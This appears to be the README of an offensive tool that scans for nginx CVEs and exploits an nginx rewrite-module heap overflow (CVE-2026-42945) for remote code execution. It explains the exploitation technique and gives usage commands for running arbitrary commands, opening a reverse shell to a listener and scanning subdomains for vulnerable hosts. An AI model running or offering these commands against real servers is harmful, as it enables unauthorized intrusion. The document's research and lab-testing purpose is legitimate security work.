<div align="center">
  <img src="banner.svg" alt="nGixShell" width="100%"/>
</div>

---

nginx CVE scanner + RCE exploit framework.

Proof of concept for **CVE-2026-42945** — a critical heap buffer overflow in NGINX's `ngx_http_rewrite_module` introduced in 2008 — plus a scanner covering **17 known nginx CVEs** with automated HTTP probes.

> Original vulnerability discovered by [depthfirst](https://depthfirst.com)'s security analysis system.

---

## Features

| Mode | Flag | Description |
|---|---|---|
| CVE database | `--list-cves` | Print all 17 CVEs with CVSS, range, probe/exploit availability |
| CVE scanner | `--cve-scan` | Detect nginx version + test all applicable CVEs |
| Single CVE | `--cve CVE-XXXX-XXXXX` | Test one specific CVE |
| Subdomain scan | `--subdomain-scan DOMAIN` | Find vulnerable nginx on subdomains |
| Version check | `--check` | Confirm if target is in vulnerable range |
| Dry run | `--dry-run` | Probe without triggering overflow |
| RCE command | `--cmd 'id'` | Execute command via CVE-2026-42945 |
| Reverse shell | `--shell` | Pop interactive shell via CVE-2026-42945 |
| Command file | `--cmd-file cmds.txt` | Execute list of commands (joined with `;`) |

**Network options:** `--tls`, `--proxy http://127.0.0.1:8080`  
**Output:** `--output results.log`, `--report`, `--verbose`  
**Tuning:** `--tries`, `--spray`, `--body-len`, `--timeout-multiplier`

---

## CVE Coverage

| CVE | CVSS | Description | Probe |
|---|---|---|---|
| CVE-2026-42945 | 9.8 CRITICAL | Heap overflow in rewrite module (RCE) | exploit |
| CVE-2026-42946 | 8.1 HIGH | Memory corruption in rewrite engine | version |
| CVE-2022-41741 | 7.8 HIGH | Memory corruption in mp4 module | version |
| CVE-2021-23017 | 7.7 HIGH | Off-by-one in DNS resolver | version |
| CVE-2016-1247 | 7.8 HIGH | Log file symlink privesc (local) | version |
| CVE-2017-7529 | 7.5 HIGH | Range filter integer overflow | HTTP probe |
| CVE-2026-40701 | 7.5 HIGH | Memory corruption in request processing | version |
| CVE-2026-42934 | 7.5 HIGH | Memory corruption (same advisory) | version |
| CVE-2022-41742 | 7.5 HIGH | Memory disclosure in mp4 module | version |
| CVE-2013-4547 | 7.5 HIGH | URI space+NUL bypass | HTTP probe |
| CVE-2013-2028 | 7.5 HIGH | Chunked encoding stack overflow | HTTP probe |
| CVE-2009-2629 | 7.5 HIGH | Buffer underflow in URI parsing | version |
| CVE-2012-2089 | 6.8 MEDIUM | Buffer overflow in mp4 module | version |
| CVE-2019-20372 | 5.3 MEDIUM | HTTP request smuggling | HTTP probe |
| CVE-2011-4963 | 5.0 MEDIUM | IPv6 literal access bypass | HTTP probe |
| CVE-2009-3896 | 5.0 MEDIUM | NULL pointer dereference DoS | version |
| CVE-2014-3616 | 4.3 MEDIUM | TLS SNI virtual host confusion | version |

---

## The Bug (CVE-2026-42945 TL;DR)

NGINX's script engine uses a two-pass process: first compute buffer size, then copy. The `is_args` flag is set on the main engine when a `rewrite` replacement contains `?`, but the length-calculation pass runs on a freshly zeroed sub-engine:

- **Length pass** sees `is_args = 0` → returns raw capture length
- **Copy pass** sees `is_args = 1` → calls `ngx_escape_uri` with `NGX_ESCAPE_ARGS`, expanding each escapable byte to 3 bytes

The copy overflows the undersized heap buffer with attacker-controlled URI data. Exploitation uses cross-request heap feng shui to corrupt an adjacent `ngx_pool_t`'s cleanup pointer, redirecting it to a fake `ngx_pool_cleanup_s` invoking `system()` on pool destruction.

---

## Affected Versions

| Product | Affected | Fixed in |
|---|---|---|
| NGINX Open Source | 0.6.27 – 1.30.0 | 1.31.0, 1.30.1 |
| NGINX Plus | R32 – R36 | R36 P4, R35 P2, R32 P6 |

Full vendor advisory: <https://my.f5.com/manage/s/article/K000160932>

---

## Usage

Tested on Ubuntu 24.04.3 LTS.

```bash
# 1. Build the vulnerable nginx container
./setup.sh

# 2. Start the server (ASLR disabled)
docker compose -f env/docker-compose.yml up

# 3. Scan all CVEs
python3 poc.py --cve-scan --host 127.0.0.1 --port 19321

# 4. Execute a command
python3 poc.py --cmd 'id' --report

# 5. Pop a shell
python3 poc.py --shell --listen-ip 172.17.0.1 --listen-port 1337

# 6. Scan subdomains
python3 poc.py --subdomain-scan example.com --scan-port 443 --scan-tls
```

---

## Disclaimer

For authorized security testing, CTF competitions, and research only.
